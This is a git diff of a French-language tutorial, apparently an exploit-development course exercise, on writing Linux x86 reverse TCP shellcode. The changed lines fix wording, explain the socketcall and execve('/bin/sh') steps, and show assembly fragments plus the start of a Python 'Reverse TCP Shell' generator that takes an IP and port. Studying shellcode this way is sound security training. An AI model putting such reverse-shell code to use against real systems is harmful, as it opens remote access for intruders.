@@ -5,7 +5,7 @@ Dans le cadre du second exercice, il est demande de réaliser un shellcode perme
 L'idée ici est dans un premier temps de créer un socket puis d'établir une connexion en indiquant une adresse IP ainsi qu'un port. Les sorties standard stdin, stdout et stderr sont redirigées afin de pouvoir être utilisées une fois la connexion établie par un shell distant. 
 
 ## Création d'un socket ##
-La principal référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. Nous prenons le protocol IP de type SOCK_STREAM.
+La principale référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. Nous prenons le protocol IP de type SOCK_STREAM et le domain IPPROTO_IP = 0.
 
 ```c
 	xor ebx, ebx
@@ -52,6 +52,8 @@ _:
 ```
 
 ## Exécution du shell ##
+nous allons pour cela utiliser execve, int execve(const char *filename, char *const argv[], char *const envp[]) afin de lancer un shell.
+Il sera de la forme execve("/bin/sh", NULL, NULL).
 Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
 
 ```c
@@ -140,8 +142,8 @@ _:
 	; execve
 	; execute un shell /bin/bash des la connexion réussie
 
-	xor ecx, ecx
-	mov edx, ecx
+	xor ecx, ecx	;argv = 0
+	mov edx, ecx	;envp = 0
 	push edx
 	push 0x68732f2f
 	push 0x6e69622f
@@ -167,7 +169,7 @@ pwd
 
 ## Améliorer la saisie de l'adresse IP et du port ##
 
-Pour cette partie, python s'avère être plus pratique que le C.
+Pour cette partie, nous utilisons un script python.
 
 ```python
 #!/usr/bin/env python
@@ -176,7 +178,7 @@ import argparse
 import struct
 
 def main():
-    parser = argparse.ArgumentParser(description="Reverser TCP Shell")
+    parser = argparse.ArgumentParser(description="Reverse TCP Shell")
     parser.add_argument('--address', dest="addressIp", default=None, type= str, help="Put your address ip", required=True)
     parser.add_argument('--port', dest="port", default=4444, type=int, help="Put the port", required=True)
     args = parser.parse_args()
